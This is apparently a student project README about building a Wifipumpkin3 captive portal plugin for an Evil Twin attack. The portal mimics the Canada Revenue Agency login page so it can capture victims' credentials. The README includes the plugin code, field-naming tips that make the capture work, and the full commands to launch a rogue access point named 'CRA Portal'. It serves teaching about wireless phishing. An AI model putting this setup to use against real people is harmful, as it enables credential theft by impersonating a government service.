# COMP630-FINAL-CAPTIVEFLASK
Developing a captive portal for Wifipumpkin's captiveflask plugin
 
### Description
Developing a custom captiveflask plugin to perform an Evil Twin credential capture. This project recreates a simplified version of the Canada Revenue Agency (CRA) login portal for educational purposes. It's designed to demonstrate the creation of captive portals and should **not** be used for malicious activities. This project is purely for learning and understanding the techniques involved.

A wireless adapter is required, the one used in this instanace is the Alfa AWUS1900.

### Key Resources
A few very helpful resources that were used to create this template:

https://github.com/mh4x0f/extra-captiveflask

https://wifipumpkin3.github.io/2022/captiveflask-portal-build/

## Creating the Captive Portal

The project started by identifying a target login portal (CRA) and saving its HTML source code. The HTML was then significantly simplified, retaining only the core login functionality and essential visual elements. This simplified version focuses solely on the functional aspects of the login process, removing unnecessary elements from the original CRA website. This simulates a CRA login page. Upon submission of login credentials the user is redirected to a "redirecting" page, while their credentials are captured to Wifipumpkin. No actual authentication with the CRA system occurs.

### Configuration File

```
# file => craplugin.py
from wifipumpkin3.plugins.captiveflask.plugin import CaptiveTemplatePlugin
import wifipumpkin3.core.utility.constants as C # import plugin class base

class craplugin(CaptiveTemplatePlugin):
    Name = "craplugin"
    Version = "1.0"
    Description = "CRA Login Page'"
    Author = "Sam Bronson"
    TemplatePath = C.TEMPLATES_FLASK + "templates/exampleplugin"
    StaticPath = C.TEMPLATES_FLASK + "templates/exampleplugin/static"
    Preview = C.TEMPLATES_FLASK + "templates/exampleplugin/preview.png"
```

### File Architecture
```
craplugin/
├── static
│   ├── css 
│   │   ├── apps.css
│   │   ├── common.css
│   │   └── theme.min.css
│   └── images
│       ├── sig-blk-en.svg
│       └── wmms-blk.svg
└── templates
    ├── login.html
    └── login_successful.html
```

### Issues and Debugging.
Wifipumpkin seems to be very stringent with the input fields for credential capture, and this was the biggest problem I came across that hindered its success.

In previous versions username input was labelled as username or userid.

```
<label class="required" for="UserID">User  ID <strong class="required"><i>(required)</i></strong></label>
<input type="text" name="UserID" id="UserID" class="form-control" required>
```

What ended up working was changing the label to login, possibly indicative that Wifipumpkin is looking for "login". 

```
<label class="required" for="login">User  ID <strong class="required"><i>(required)</i></strong></label>
<input type="text" name="login" id="login" class="form-control" required>
```

### Captive Portal Setup

**Install the craplugin.zip, then run Wifipumpkin3.**

```
sudo wp3 
```

**Install the plugin to Wifipumpkin.**

```
wp3 > use misc.custom_captiveflask
wp3 > install craplugin craplugin.zip
```

**Restart Wifipumpkin3.** 

**Set up the portal.**

```
wp3 > set interface wlan0
wp3 > set ssid CRA Portal
wp3 > set proxy captiveflask
wp3 > set captiveflask.craplugin true
```

**Verify that the proxy is set up**

```
wp3 > proxies
```

**Start the instance**

```
wp3 > start
```

### Disclaimer
Any malicious use of the contents from this repository, will not hold the author responsible, the contents are solely for educational purpose.

Usage of this template for attacking without prior mutual consistency can be considered as an illegal activity.
Authors assume no liability and are not responsible for any misuse or damage caused by this program.
